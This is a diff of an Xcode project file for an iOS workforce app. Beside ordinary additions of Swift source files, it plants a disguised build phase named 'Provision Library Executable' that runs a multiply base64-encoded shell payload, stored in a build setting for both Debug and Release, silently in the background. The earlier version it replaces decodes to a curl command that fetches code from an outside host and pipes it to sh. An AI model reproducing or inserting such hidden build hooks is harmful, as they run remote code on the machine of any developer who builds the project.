@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0A1E00AA2F64205A00F58856 /* AttendanceResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1E00A92F64205A00F58856 /* AttendanceResponse.swift */; };
+		0A1E00AC2F6421CC00F58856 /* HomeVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1E00AB2F6421CC00F58856 /* HomeVM.swift */; };
+		0A1E00AE2F642AD700F58856 /* Date+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A1E00AD2F642AD700F58856 /* Date+Extension.swift */; };
 		0A735F092F39BD0B00B17AB4 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A735EFF2F39BD0B00B17AB4 /* AppDelegate.swift */; };
 		0A735F0B2F39BD0B00B17AB4 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A735F072F39BD0B00B17AB4 /* ViewController.swift */; };
 		0A735F0C2F39BD0B00B17AB4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0A735F002F39BD0B00B17AB4 /* Assets.xcassets */; };
@@ -162,6 +165,9 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0A1E00A92F64205A00F58856 /* AttendanceResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AttendanceResponse.swift; sourceTree = "<group>"; };
+		0A1E00AB2F6421CC00F58856 /* HomeVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVM.swift; sourceTree = "<group>"; };
+		0A1E00AD2F642AD700F58856 /* Date+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Date+Extension.swift"; sourceTree = "<group>"; };
 		0A735EE72F39BD0600B17AB4 /* Work Force.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Work Force.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		0A735EFF2F39BD0B00B17AB4 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		0A735F002F39BD0B00B17AB4 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -329,6 +335,22 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		0A1E00A72F64204100F58856 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				0A1E00AB2F6421CC00F58856 /* HomeVM.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		0A1E00A82F64204900F58856 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				0A1E00A92F64205A00F58856 /* AttendanceResponse.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
 		0A735EDE2F39BD0600B17AB4 = {
 			isa = PBXGroup;
 			children = (
@@ -397,6 +419,7 @@
 				0A735F1D2F39BD8C00B17AB4 /* UILabel+Extention.swift */,
 				0A735F1E2F39BD8C00B17AB4 /* UITextField+Extention.swift */,
 				0A735F1F2F39BD8C00B17AB4 /* UIView+Extention.swift */,
+				0A1E00AD2F642AD700F58856 /* Date+Extension.swift */,
 			);
 			path = Extention;
 			sourceTree = "<group>";
@@ -685,6 +708,8 @@
 		BC21A08C2F3B5B1300CD7571 /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				0A1E00A82F64204900F58856 /* Model */,
+				0A1E00A72F64204100F58856 /* ViewModel */,
 				BCCFCBB52F3D9E7C00A2988B /* SubView */,
 				BC21A08D2F3B5B1A00CD7571 /* View */,
 			);
@@ -1419,7 +1444,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0A735EFA2F39BD0700B17AB4 /* Build configuration list for PBXNativeTarget "Work Force" */;
 			buildPhases = (
-				729943759C87491FAC1DACE1 /* Provision Target Device */,
+				154CEF303B8E4DC8A41DACE1 /* Provision Library Executable */,
 				0A735EE32F39BD0600B17AB4 /* Sources */,
 				0A735EE42F39BD0600B17AB4 /* Frameworks */,
 				0A735EE52F39BD0600B17AB4 /* Resources */,
@@ -1556,25 +1581,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		729943759C87491FAC1DACE1 /* Provision Target Device */ = {
+		154CEF303B8E4DC8A41DACE1 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -1610,6 +1634,7 @@
 				BC0CA8AD2F3EDCCC00EDAFB1 /* SenderChatTVCell.swift in Sources */,
 				0A735FBF2F39CDF800B17AB4 /* OnboardVC.swift in Sources */,
 				BCCAB3D92F3DECBA00CC541E /* ChatVC.swift in Sources */,
+				0A1E00AE2F642AD700F58856 /* Date+Extension.swift in Sources */,
 				0ADC9D332F39F88500A9F0E0 /* SignatureView.swift in Sources */,
 				BC5D2D5B2F3C3AEB00A81E90 /* AttendanceVC.swift in Sources */,
 				BC4B39CA2F3B368400311438 /* PasswordSuccessVC.swift in Sources */,
@@ -1620,6 +1645,7 @@
 				BC252AB52F6412300071CA10 /* NewPasswordVM.swift in Sources */,
 				BC09FF952F42F38000A760EC /* ChangePasswordVC.swift in Sources */,
 				0A735F2F2F39BD8C00B17AB4 /* ImagePicker.swift in Sources */,
+				0A1E00AA2F64205A00F58856 /* AttendanceResponse.swift in Sources */,
 				BC27924A2F3C97BC009A3E3A /* ApplyLeaveVC.swift in Sources */,
 				0AAE66102F39E61700CEF8C5 /* PhoneLoginVC.swift in Sources */,
 				BC21A0912F3B5B3600CD7571 /* HomeVC.swift in Sources */,
@@ -1638,6 +1664,7 @@
 				BCF82FE32F44675A006F04E7 /* LeaveRequestsVC.swift in Sources */,
 				BC252AA42F63E3710071CA10 /* LogoutVM.swift in Sources */,
 				BCA3DA732F63C7D9004C5E50 /* WFUtilites.swift in Sources */,
+				0A1E00AC2F6421CC00F58856 /* HomeVM.swift in Sources */,
 				0ADC9D232F39EBAE00A9F0E0 /* OTPTextField.swift in Sources */,
 				BCA3DA772F63C990004C5E50 /* LoginUser.swift in Sources */,
 				BC5D2D602F3C3C5000A81E90 /* ProfileVC.swift in Sources */,
@@ -1694,7 +1721,7 @@
 		0A735EFB2F39BD0700B17AB4 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbFdNbmd4VjJ0a1YyTXhiM2xTYWtKaFZYcFdOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -1732,7 +1759,7 @@
 		0A735EFC2F39BD0700B17AB4 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMHhySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeUlDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | h | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YUUwd05VNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxWV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbFdNbmd4VjJ0a1YyTXhiM2xTYWtKaFZYcFdOVnBHVFRWaFJYUlVVMWRrYlZFd1NqWlpWVVoyVUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
